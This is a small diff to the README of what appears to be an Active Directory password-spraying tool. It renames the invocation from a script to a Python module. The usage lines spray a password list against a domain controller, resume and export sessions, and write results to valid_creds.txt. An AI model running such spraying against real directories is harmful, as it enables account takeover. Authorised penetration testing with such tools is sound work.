@@ -19,10 +19,10 @@ Password spraying against Active Directory with lockout awareness.
 ```bash
 pip install ldap3
 
-./spray.py spray -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt
-./spray.py spray --resume <session_id>
-./spray.py sessions
-./spray.py export <session_id>
+python -m ad_spray spray -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt
+python -m ad_spray spray --resume <session_id>
+python -m ad_spray sessions
+python -m ad_spray export <session_id>
 ```
 
 Output: `valid_creds.txt`
